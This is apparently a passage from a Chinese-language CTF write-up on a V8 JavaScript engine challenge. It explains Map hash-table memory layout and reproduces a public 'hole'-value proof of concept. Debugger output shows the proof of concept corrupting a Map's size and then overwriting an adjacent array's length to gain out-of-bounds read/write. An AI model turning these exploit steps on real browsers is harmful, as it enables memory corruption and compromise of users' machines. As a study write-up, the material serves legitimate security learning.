class="number">1</span>: <span class="number">2</span> -&gt; <span class="number">0x1d830000408d</span> &lt;String[<span class="number">1</span>]: <span class="meta">#b&gt;</span></span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>对象 JSMap 的详细信息如下：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">d8&gt; %DebugPrint(<span class="built_in">map</span>);  </span><br><span class="line">DebugPrint: <span class="number">0x1d830004b9c9</span>: [JSMap]</span><br><span class="line"> - <span class="built_in">map</span>: <span class="number">0x1d83001862f1</span> &lt;Map[<span class="number">16</span>](HOLEY_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: <span class="number">0x1d8300186431</span> &lt;Object <span class="built_in">map</span> = <span class="number">0x1d8300186319</span>&gt;</span><br><span class="line"> - elements: <span class="number">0x1d8300002259</span> &lt;FixedArray[<span class="number">0</span>]&gt; [HOLEY_ELEMENTS]</span><br><span class="line"> - table: <span class="number">0x1d830004b9d9</span> &lt;OrderedHashMap[<span class="number">17</span>]&gt;</span><br><span class="line"> - properties: <span class="number">0x1d8300002259</span> &lt;FixedArray[<span class="number">0</span>]&gt;</span><br><span class="line"> - All own properties (excluding elements): &#123;&#125;</span><br><span class="line"><span class="number">0x1d83001862f1</span>: [Map] in OldSpace</span><br><span class="line"> - type: JS_MAP_TYPE</span><br><span class="line"> - instance size: <span class="number">16</span></span><br><span class="line"> - inobject properties: <span class="number">0</span></span><br><span class="line"> - elements kind: HOLEY_ELEMENTS</span><br><span class="line"> - unused property fields: <span class="number">0</span></span><br><span class="line"> - <span class="keyword">enum</span> length: invalid</span><br><span class="line"> - stable_map</span><br><span class="line"> - back pointer: <span class="number">0x1d83000023e1</span> &lt;undefined&gt;</span><br><span class="line"> - prototype_validity cell: <span class="number">0x1d83001443cd</span> &lt;Cell value= <span class="number">1</span>&gt;</span><br><span class="line"> - instance descriptors (own) #<span class="number">0</span>: <span class="number">0x1d83000021ed</span> &lt;Other heap object (STRONG_DESCRIPTOR_ARRAY_TYPE)&gt;</span><br><span class="line"> - prototype: <span class="number">0x1d8300186431</span> &lt;Object <span class="built_in">map</span> = <span class="number">0x1d8300186319</span>&gt;</span><br><span class="line"> - constructor: <span class="number">0x1d83001862bd</span> &lt;JSFunction Map (sfi = <span class="number">0x1d83001557b9</span>)&gt;</span><br><span class="line"> - dependent code: <span class="number">0x1d83000021e1</span> &lt;Other heap object (WEAK_ARRAY_LIST_TYPE)&gt;</span><br><span class="line"> - construction counter: <span class="number">0</span></span><br><span class="line"></span><br><span class="line">[object Map]</span><br></pre></td></tr></table></figure>
<ul>
<li>打印 <code>table</code> 属性：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">20</span>xw <span class="number">0x1d830004b9d9</span><span class="number">-1</span></span><br><span class="line"><span class="number">0x1d830004b9d8</span>:	<span class="number">0x00002c29</span>	<span class="number">0x00000022</span>	<span class="number">0x00000002</span>	<span class="number">0x00000002</span></span><br><span class="line"><span class="number">0x1d830004b9e8</span>:	<span class="number">0x00000004</span>	<span class="number">0x00000000</span>	<span class="number">0x00000002</span>	<span class="number">0x00002459</span></span><br><span class="line"><span class="number">0x1d830004b9f8</span>:	<span class="number">0x00002459</span>	<span class="number">0xfffffffe</span>	<span class="number">0x00000004</span>	<span class="number">0x0000408d</span></span><br><span class="line"><span class="number">0x1d830004ba08</span>:	<span class="number">0xfffffffe</span>	<span class="number">0x000023e1</span>	<span class="number">0x000023e1</span>	<span class="number">0x000023e1</span></span><br><span class="line"><span class="number">0x1d830004ba18</span>:	<span class="number">0x000023e1</span>	<span class="number">0x000023e1</span>	<span class="number">0x000023e1</span>	<span class="number">0x000025d5</span></span><br><span class="line">pwndbg&gt; job <span class="number">0x00002459</span>+<span class="number">0x1d8300000000</span></span><br><span class="line"><span class="number">0x1d8300002459</span>: [Oddball] in ReadOnlySpace: <span class="meta">#hole</span></span><br><span class="line">pwndbg&gt; job <span class="number">0x000023e1</span>+<span class="number">0x1d8300000000</span></span><br><span class="line"><span class="number">0x1d83000023e1</span>: [Oddball] in ReadOnlySpace: <span class="meta">#undefined</span></span><br></pre></td></tr></table></figure>
<ul>
<li>整数在 V8 中表示为前31位，最后一位不使用（这就是“0x1”表示为“0x2”，“0xfffffffe”表示“-1”的原因）</li>
<li>hole 在本程序中用 <code>0x00002459</code> 表示</li>
<li>undefined 在本程序中用 <code>0x000023e1</code> 表示</li>
</ul>
<p>记录 OrderedHashMap 的一些重要元数据的粗略布局：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">table + <span class="number">0x10</span> =&gt; Map capacity (<span class="number">0x4</span>) </span><br><span class="line">table + <span class="number">0x14</span> =&gt; Bucket<span class="number">-0</span> data <span class="comment">/* 0 */</span></span><br><span class="line">table + <span class="number">0x18</span> =&gt; Bucket<span class="number">-1</span> data <span class="comment">/* 1 */</span></span><br><span class="line">table + <span class="number">0x1c</span> =&gt; Entry<span class="number">-0</span> key (<span class="number">0x00002459</span>) <span class="comment">/* #hole */</span></span><br><span class="line">table + <span class="number">0x20</span> =&gt; Entry<span class="number">-0</span> value (<span class="number">0x00002459</span>) <span class="comment">/* #hole */</span></span><br><span class="line">table + <span class="number">0x24</span> =&gt; Entry<span class="number">-0</span> next_ptr</span><br><span class="line">table + <span class="number">0x28</span> =&gt; Entry<span class="number">-1</span> key (<span class="number">0x00000004</span>) <span class="comment">/* 2 */</span></span><br><span class="line">table + <span class="number">0x2c</span> =&gt; Entry<span class="number">-1</span> value (<span class="number">0x0000408d</span>) <span class="comment">/* #b */</span></span><br><span class="line">table + <span class="number">0x30</span> =&gt; Entry<span class="number">-1</span> next_ptr</span><br></pre></td></tr></table></figure>
<ul>
<li>先预留 <code>0x4 * capacity/2</code> 的空间用于填充 Bucket data（存储桶数据）</li>
<li>之后的空间会以 <code>0x4 * 3</code> 为单位来储存各个 <code>Entry</code> 信息</li>
<li>被 <code>delete</code> 方法删除的区域需要用 hole 填充</li>
<li>而之后的空间则被 undefined 填充</li>
</ul>
<p><strong>JavaScript SandBox &amp; JIT</strong></p>
<p>对于 JavaScript 来说，沙箱并非传统意义上的沙箱，它只是一种语法上的 Hack 写法，沙箱是一种安全机制，把一些不信任的代码运行在沙箱之内，使其不能访问沙箱之外的代码 </p>
<p>当需要解析或者执行不可信的 JavaScript 代码时，需要隔离被执行代码的执行环境，并对执行代码中可访问对象进行限制，通常开始可以把 JavaScript 中处理模块依赖关系的闭包称之为沙箱</p>
<p>我们大致可以把沙箱的实现总体分为两个部分：</p>
<ul>
<li>构建一个闭包环境</li>
<li>模拟原生浏览器对象</li>
</ul>
<p>一个重要的保护是，它将所有外部指针转换为查找表的索引，例如指向 Web 程序集 RWX 页的指针和 ArrayBuffer 后备存储的指针，因此，我们不能使用普通方法来实现任意读写</p>
<p>而 JavaScript JIT（Just-In-Time）则是另一种机制：</p>
<p>JIT compiler 混合了编译器和解释器的优点，大幅提高了 JavaScript 的运行速度：</p>
<ul>
<li>一开始只是简单的使用解释器执行，当某一行代码被执行了几次，这行代码会被打上 Warm 的标签，当某一行代码被执行了很多次，这行代码会被打上 Hot 的标签 </li>
<li>被打上 Warm 标签的代码会被传给 Baseline Compiler 编译且储存，同时按照行数和变量类型被索引</li>
<li>被打上 Hot 标签的代码会被传给 Optimizing compiler，这里会对这部分带码做更优化的编译 </li>
<li>当发现执行的代码命中索引，会直接取出编译后的代码执行，从而不需要重复编译已经编译过的代码</li>
</ul>
<p>利用 JIT 机制就可以绕过 SandBox</p>
<p><strong>学习相关 POC</strong></p>
<p>在 path 中给出了一篇文章 <code>crbug.com/1263462</code> 先学习它</p>
<p>这篇文章大概讲述了 V8 对 TheHole 的特殊处理（具体怎么处理的暂时不清楚），利用这个特性，可以对 <code>Map</code> 进行破坏</p>
<p>POC 如下：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> map = <span class="keyword">new</span> <span class="built_in">Map</span>();</span><br><span class="line"><span class="comment">/* 由于对孔值的特殊处理,这最终将 Map 的大小设置为&quot;-1&quot; */</span></span><br><span class="line">map.set(<span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">map.set(hole, <span class="number">1</span>);</span><br><span class="line">map.delete(hole);</span><br><span class="line">map.delete(hole);</span><br><span class="line">map.delete(<span class="number">1</span>);</span><br><span class="line"><span class="comment">/* print(map.size); Size is now -1 */</span></span><br></pre></td></tr></table></figure>
<p>先查看这个 hole 和题目中的 hole 方法有什么关系：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Isolate::clear_pending_exception</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    DCHECK(!thread_local_top()-&gt;pending_exception_.IsException(<span class="keyword">this</span>));</span><br><span class="line">    thread_local_top()-&gt;pending_exception_ = ReadOnlyRoots(<span class="keyword">this</span>).the_hole_value();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>the_hole_value</code> 在本题的 path 中也出现过</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">%DebugPrint(hole); </span><br><span class="line">DebugPrint: <span class="number">0x37c70800242d</span>: [Oddball] in ReadOnlySpace: <span class="meta">#hole</span></span><br></pre></td></tr></table></figure>
<ul>
<li>使用 <code>DebugPrint</code> 可以发现 hole 是 <code>Oddball</code> 引用类型</li>
</ul>
<p>具体的细节暂时不用管，我们只需要知道这个 POC 可以破坏 <code>Map</code> 就行了</p>
<p><strong>入侵思路</strong></p>
<p>先依葫芦画瓢把 POC 中的利用复刻一份：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> c = [];</span><br><span class="line">m = <span class="keyword">new</span> <span class="built_in">Map</span>();</span><br><span class="line">m.set(<span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">m.set(c.hole(), <span class="number">1</span>);</span><br><span class="line">m.delete(c.hole());</span><br><span class="line">m.delete(c.hole());</span><br><span class="line">m.delete(<span class="number">1</span>);</span><br><span class="line">print(map.size);</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  x64.release git:(<span class="number">63</span>cb7fb817) ✗ ./d8 ./<span class="built_in">exp</span>.js</span><br><span class="line"><span class="number">-1</span></span><br></pre></td></tr></table></figure>
<ul>
<li>成功将 <code>Map</code> 进行了破坏</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">d8&gt; %DebugPrint(m);</span><br><span class="line">DebugPrint: <span class="number">0x14080004ba05</span>: [JSMap]</span><br><span class="line"> - <span class="built_in">map</span>: <span class="number">0x1408001862f1</span> &lt;Map[<span class="number">16</span>](HOLEY_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: <span class="number">0x140800186431</span> &lt;Object <span class="built_in">map</span> = <span class="number">0x140800186319</span>&gt;</span><br><span class="line"> - elements: <span class="number">0x140800002259</span> &lt;FixedArray[<span class="number">0</span>]&gt; [HOLEY_ELEMENTS]</span><br><span class="line"> - table: <span class="number">0x14080004baad</span> &lt;OrderedHashMap[<span class="number">17</span>]&gt;</span><br><span class="line"> - properties: <span class="number">0x140800002259</span> &lt;FixedArray[<span class="number">0</span>]&gt;</span><br><span class="line"> - All own properties (excluding elements): &#123;&#125;</span><br><span class="line"><span class="number">0x1408001862f1</span>: [Map] in OldSpace</span><br><span class="line"> - type: JS_MAP_TYPE</span><br><span class="line"> - instance size: <span class="number">16</span></span><br><span class="line"> - inobject properties: <span class="number">0</span></span><br><span class="line"> - elements kind: HOLEY_ELEMENTS</span><br><span class="line"> - unused property fields: <span class="number">0</span></span><br><span class="line"> - <span class="keyword">enum</span> length: invalid</span><br><span class="line"> - stable_map</span><br><span class="line"> - back pointer: <span class="number">0x1408000023e1</span> &lt;undefined&gt;</span><br><span class="line"> - prototype_validity cell: <span class="number">0x1408001443cd</span> &lt;Cell value= <span class="number">1</span>&gt;</span><br><span class="line"> - instance descriptors (own) #<span class="number">0</span>: <span class="number">0x1408000021ed</span> &lt;Other heap object (STRONG_DESCRIPTOR_ARRAY_TYPE)&gt;</span><br><span class="line"> - prototype: <span class="number">0x140800186431</span> &lt;Object <span class="built_in">map</span> = <span class="number">0x140800186319</span>&gt;</span><br><span class="line"> - constructor: <span class="number">0x1408001862bd</span> &lt;JSFunction Map (sfi = <span class="number">0x1408001557b9</span>)&gt;</span><br><span class="line"> - dependent code: <span class="number">0x1408000021e1</span> &lt;Other heap object (WEAK_ARRAY_LIST_TYPE)&gt;</span><br><span class="line"> - construction counter: <span class="number">0</span></span><br><span class="line"></span><br><span class="line">[object Map]</span><br></pre></td></tr></table></figure>
<ul>
<li>打印对应的 <code>table</code>：（此时 <code>Map</code> 已经被破坏，在 <code>Map.size == -1</code> 的情况下，不能使用 <code>job</code> 命令）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">20</span>xw <span class="number">0x14080004baad</span><span class="number">-1</span></span><br><span class="line"><span class="number">0x14080004baac</span>:	<span class="number">0x00002c29</span>	<span class="number">0x00000022</span>	<span class="number">0xfffffffe</span>	<span class="number">0x00000000</span></span><br><span class="line"><span class="number">0x14080004babc</span>:	<span class="number">0x00000004</span>	<span class="number">0xfffffffe</span>	<span class="number">0xfffffffe</span>	<span class="number">0x000023e1</span></span><br><span class="line"><span class="number">0x14080004bacc</span>:	<span class="number">0x000023e1</span>	<span class="number">0x000023e1</span>	<span class="number">0x000023e1</span>	<span class="number">0x000023e1</span></span><br><span class="line"><span class="number">0x14080004badc</span>:	<span class="number">0x000023e1</span>	<span class="number">0x000023e1</span>	<span class="number">0x000023e1</span>	<span class="number">0x000023e1</span></span><br><span class="line"><span class="number">0x14080004baec</span>:	<span class="number">0x000023e1</span>	<span class="number">0x000023e1</span>	<span class="number">0x000023e1</span>	<span class="number">0x000025d5</span></span><br></pre></td></tr></table></figure>
<ul>
<li>先执行一次 <code>m.set(0x8,-1)</code> 后再次打印 <code>table</code>：（现在可以使用 <code>job</code> 命令）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">20</span>xw <span class="number">0x14080004baad</span><span class="number">-1</span></span><br><span class="line"><span class="number">0x14080004baac</span>:	<span class="number">0x00002c29</span>	<span class="number">0x00000022</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span></span><br><span class="line"><span class="number">0x14080004babc</span>:	<span class="number">0x00000010</span>	<span class="number">0xfffffffe</span>	<span class="number">0xfffffffe</span>	<span class="number">0x000023e1</span></span><br><span class="line"><span class="number">0x14080004bacc</span>:	<span class="number">0x000023e1</span>	<span class="number">0x000023e1</span>	<span class="number">0x000023e1</span>	<span class="number">0x000023e1</span></span><br><span class="line"><span class="number">0x14080004badc</span>:	<span class="number">0x000023e1</span>	<span class="number">0x000023e1</span>	<span class="number">0x000023e1</span>	<span class="number">0x000023e1</span></span><br><span class="line"><span class="number">0x14080004baec</span>:	<span class="number">0x000023e1</span>	<span class="number">0x000023e1</span>	<span class="number">0x000023e1</span>	<span class="number">0x000025d5</span></span><br></pre></td></tr></table></figure>
<ul>
<li>新写入的 <code>0x10</code>(JS num:8) 覆盖了 <code>table + 0x10</code> 的位置（Bucket data[-1]），而上面提到这个位置就是 <code>Map capacity</code></li>
<li>正因为如此，存储桶被扩展了，元素 Entry 的位置也会改变（其实这里并不是 Entry 的位置发生了改变，而是 V8 为了预留 Bucket data 的空间，而认为 Entry 的位置向后进行了移动）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; job <span class="number">0x14080004baad</span></span><br><span class="line"><span class="number">0x14080004baad</span>: [OrderedHashMap]</span><br><span class="line"> - FixedArray length: <span class="number">17</span></span><br><span class="line"> - elements: <span class="number">0</span></span><br><span class="line"> - deleted: <span class="number">0</span></span><br><span class="line"> - buckets: <span class="number">8</span></span><br><span class="line"> - capacity: <span class="number">16</span></span><br><span class="line"> - buckets: &#123;</span><br><span class="line">              <span class="number">0</span>: <span class="number">-1</span></span><br><span class="line">              <span class="number">1</span>: <span class="number">-1</span></span><br><span class="line">              <span class="number">2</span>: <span class="number">0x1408000023e1</span> &lt;undefined&gt;</span><br><span class="line">              <span class="number">3</span>: <span class="number">0x1408000023e1</span> &lt;undefined&gt;</span><br><span class="line">              <span class="number">4</span>: <span class="number">0x1408000023e1</span> &lt;undefined&gt;</span><br><span class="line">              <span class="number">5</span>: <span class="number">0x1408000023e1</span> &lt;undefined&gt;</span><br><span class="line">              <span class="number">6</span>: <span class="number">0x1408000023e1</span> &lt;undefined&gt;</span><br><span class="line">              <span class="number">7</span>: <span class="number">0x1408000023e1</span> &lt;undefined&gt;</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: &#123;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<p>因此修改 POC 为：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> c = [];</span><br><span class="line">m = <span class="keyword">new</span> <span class="built_in">Map</span>();</span><br><span class="line">m.set(<span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">m.set(c.hole(), <span class="number">1</span>);</span><br><span class="line">m.delete(c.hole());</span><br><span class="line">m.delete(c.hole());</span><br><span class="line">m.delete(<span class="number">1</span>);</span><br><span class="line">oob_arr = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">1.1</span>, <span class="number">2.2</span>);</span><br></pre></td></tr></table></figure>
<ul>
<li>打印 JSMap 和 JSArray 对象的内存信息：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">d8&gt; %DebugPrint(m)</span><br><span class="line">DebugPrint: <span class="number">0x233e0004ba25</span>: [JSMap]</span><br><span class="line"> - <span class="built_in">map</span>: <span class="number">0x233e001862f1</span> &lt;Map[<span class="number">16</span>](HOLEY_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: <span class="number">0x233e00186431</span> &lt;Object <span class="built_in">map</span> = <span class="number">0x233e00186319</span>&gt;</span><br><span class="line"> - elements: <span class="number">0x233e00002259</span> &lt;FixedArray[<span class="number">0</span>]&gt; [HOLEY_ELEMENTS]</span><br><span class="line"> - table: <span class="number">0x233e0004bacd</span> &lt;OrderedHashMap[<span class="number">17</span>]&gt;</span><br><span class="line"> - properties: <span class="number">0x233e00002259</span> &lt;FixedArray[<span class="number">0</span>]&gt;</span><br><span class="line"> - All own properties (excluding elements): &#123;&#125;</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">d8&gt; %DebugPrint(oob_arr)</span><br><span class="line">DebugPrint: <span class="number">0x233e0004bb19</span>: [JSArray]</span><br><span class="line"> - <span class="built_in">map</span>: <span class="number">0x233e0018e6bd</span> &lt;Map[<span class="number">16</span>](PACKED_DOUBLE_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: <span class="number">0x233e0018e11d</span> &lt;JSArray[<span class="number">0</span>]&gt;</span><br><span class="line"> - elements: <span class="number">0x233e0004bb29</span> &lt;FixedDoubleArray[<span class="number">2</span>]&gt; [PACKED_DOUBLE_ELEMENTS]</span><br><span class="line"> - length: <span class="number">2</span></span><br><span class="line"> - properties: <span class="number">0x233e00002259</span> &lt;FixedArray[<span class="number">0</span>]&gt;</span><br><span class="line"> - All own properties (excluding elements): &#123;</span><br><span class="line">    <span class="number">0x233e00006551</span>: [String] in ReadOnlySpace: <span class="meta">#length: 0x233e00144255 <span class="meta-string">&lt;AccessorInfo name= 0x233e00006551 &lt;String[6]: #length&gt;</span>, data= 0x233e000023e1 <span class="meta-string">&lt;undefined&gt;</span>&gt; (const accessor descriptor), location: descriptor</span></span><br><span class="line"> &#125;</span><br><span class="line"> - elements: <span class="number">0x233e0004bb29</span> &lt;FixedDoubleArray[<span class="number">2</span>]&gt; &#123;</span><br><span class="line">           <span class="number">0</span>: <span class="number">1.1</span></span><br><span class="line">           <span class="number">1</span>: <span class="number">2.2</span></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">......</span><br></pre></td></tr></table></figure>
<ul>
<li><code>oob_arr</code> 和 <code>m-&gt;table</code> 的位置很接近（<code>0x233e0004bacd + 0x4c == 0x233e0004bb19</code>）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">20</span>xw <span class="number">0x233e0004bb19</span><span class="number">-1</span></span><br><span class="line"><span class="number">0x233e0004bb18</span>:	<span class="number">0x0018e6bd</span>	<span class="number">0x00002259</span>	<span class="number">0x0004bb29</span>	<span class="number">0x00000004</span></span><br></pre></td></tr></table></figure>
<ul>
<li><code>oob_arr+0x8</code>（<code>table+0x54</code>）：<code>oob_arr-&gt;elements</code></li>
<li><code>oob_arr+0xc</code>（<code>table+0x58</code>）：<code>oob_arr-&gt;length</code></li>
</ul>
<p>先执行一次 <code>m.set(0x10,-1)</code> 后再次打印 <code>table</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; job <span class="number">0x233e0004bacd</span></span><br><span class="line"><span class="number">0x233e0004bacd</span>: [OrderedHashMap]</span><br><span class="line"> - FixedArray length: <span class="number">17</span></span><br><span class="line"> - elements: <span class="number">0</span></span><br><span class="line"> - deleted: <span class="number">0</span></span><br><span class="line"> - buckets: <span class="number">16</span></span><br><span class="line"> - capacity: <span class="number">32</span></span><br><span class="line"> - buckets: &#123;</span><br><span class="line">              <span class="number">0</span>: <span class="number">-1</span></span><br><span class="line">              <span class="number">1</span>: <span class="number">-1</span></span><br><span class="line">              <span class="number">2</span>: <span class="number">0x233e000023e1</span> &lt;undefined&gt;</span><br><span class="line">              <span class="number">3</span>: <span class="number">0x233e000023e1</span> &lt;undefined&gt;</span><br><span class="line">              <span class="number">4</span>: <span class="number">0x233e000023e1</span> &lt;undefined&gt;</span><br><span class="line">              <span class="number">5</span>: <span class="number">0x233e000023e1</span> &lt;undefined&gt;</span><br><span class="line">              <span class="number">6</span>: <span class="number">0x233e000023e1</span> &lt;undefined&gt;</span><br><span class="line">              <span class="number">7</span>: <span class="number">0x233e000023e1</span> &lt;undefined&gt;</span><br><span class="line">              <span class="number">8</span>: <span class="number">0x233e000023e1</span> &lt;undefined&gt;</span><br><span class="line">              <span class="number">9</span>: <span class="number">0x233e000023e1</span> &lt;undefined&gt;</span><br><span class="line">             <span class="number">10</span>: <span class="number">0x233e000023e1</span> &lt;undefined&gt;</span><br><span class="line">             <span class="number">11</span>: <span class="number">0x233e000023e1</span> &lt;undefined&gt;</span><br><span class="line">             <span class="number">12</span>: <span class="number">0x233e000023e1</span> &lt;undefined&gt;</span><br><span class="line">             <span class="number">13</span>: <span class="number">0x233e000023e1</span> &lt;undefined&gt;</span><br><span class="line">                 <span class="comment">/* 到这里已经进入oob_arr的区域了 */</span></span><br><span class="line">             <span class="number">14</span>: <span class="number">0x233e0018e6bd</span> &lt;Map[<span class="number">16</span>](PACKED_DOUBLE_ELEMENTS)&gt; </span><br><span class="line">             <span class="number">15</span>: <span class="number">0x233e00002259</span> &lt;FixedArray[<span class="number">0</span>]&gt;</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: &#123;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>由于 <code>Map</code> 的容量被覆盖为32，这意味着存储桶扩展到16</li>
<li>由于存储桶的扩展，元素指针 Entry 向后移动了 <code>(16-2)*0x4 = 0x38</code> 字节</li>
<li>所以，之前映射键的第一个元素 Entry 存储在 <code>table+0x1c</code> 中，现在它将存储在 <code>table+0x54</code> 中</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">30</span>xw <span class="number">0x233e0004bacd</span><span class="number">-1</span>+<span class="number">0x54</span></span><br><span class="line"><span class="number">0x233e0004bb20</span>:	<span class="number">0x0004bb29</span>	<span class="number">0x00000004</span>	<span class="number">0x00002ac1</span>	<span class="number">0x00000004</span></span><br><span class="line"><span class="number">0x233e0004bb30</span>:	<span class="number">0x9999999a</span>	<span class="number">0x3ff19999</span>	<span class="number">0x9999999a</span>	<span class="number">0x40019999</span></span><br></pre></td></tr></table></figure>
<ul>
<li>但是 <code>table+0x54</code> 是存储的元素 <code>oob_arr</code> 指针，<code>table+0x58</code> 是 <code>oob_arr</code> 长度</li>
<li>因此，在损坏之后，如果我们第三次调用 <code>map.set</code>，它将覆盖 <code>oob_arr</code> 元素的指针和长度，通过进一步的技术，我们将能够使用损坏的 <code>oob_arr</code> 作为我们的读写基元</li>
</ul>
